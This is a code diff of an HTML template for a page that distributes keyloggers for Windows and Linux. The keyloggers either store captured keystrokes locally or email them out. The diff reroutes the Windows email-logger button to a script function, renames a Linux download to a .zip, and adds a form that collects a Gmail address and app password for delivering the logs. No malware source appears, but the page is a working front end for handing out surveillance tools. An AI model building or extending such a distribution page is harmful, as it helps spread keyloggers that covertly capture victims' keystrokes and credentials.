@@ -39,9 +39,12 @@
       <div class="tab-pane fade show active" id="windows" role="tabpanel" aria-labelledby="home-tab">
           Below you will all the keyloggers that we offer for the Windows environment. A keylogger that stores logs in a local folder and a keylogger that emails you the logs.
           <div class="buttonContainer">
+              <!--
               <a href="./loggers/keyloggerWinMail.exe" download>
                   <button type="button" class="btn btn-primary active">Email Logger</button>
               </a>
+              -->
+              <button type="button" class="btn btn-primary active" onclick="shadowEverything()">Email Logger</button>
               <a href="./loggers/keyloggerWinFiles.exe" download>
                   <button type="button" class="btn btn-primary active">Local files Logger</button>
               </a>
@@ -50,7 +53,7 @@
       <div class="tab-pane fade" id="linux" role="tabpanel" aria-labelledby="profile-tab">
           Below you will all the keyloggers that we offer for the Linux environment. A keylogger that stores logs in a local folder and a keylogger that emails you the logs.
           <div class="buttonContainer">
-              <a href="./loggers/keyloggerLinMail" download>
+              <a href="./loggers/keyloggerLinMail.zip" download>
                   <button type="button" class="btn btn-primary active">Email Logger</button>
               </a>
               <a href="./loggers/keyloggerLinFiles" download>
@@ -60,6 +63,28 @@
       </div>
   </div>
 </div>
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+      <div class="modal-dialog" role="document">
+          <div class="modal-content clearfix">
+              <button type="button" class="close" onclick="closeForm()"><span aria-hidden="true">×</span></button>
+              <div class="modal-body">
+                  <form action="#" th:action="@{/process_gmail}" th:object="${user}" method="post" id="gmailCredentials">
+                      <h3 class="title">Gmail Credentials</h3>
+                      <p class="description">Send Logs right to your Gmail</p>
+                      <div class="form-group">
+                          <span class="input-icon"><i class="fa fa-user"></i></span>
+                          <input type="email" class="form-control" placeholder="Gmail" id="gmail" th:field="*{gmail}">
+                      </div>
+                      <div class="form-group">
+                          <span class="input-icon"><i class="fas fa-key"></i></span>
+                          <input type="password" class="form-control" placeholder="Application specific password" th:field="*{app_password}">
+                      </div>
+                      <input type="submit" value="PROCESS" class="btn" style="width:100px;margin-top:20px;" onclick="closeForm();" >
+                  </form>
+              </div>
+          </div>
+      </div>
+  </div>
 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
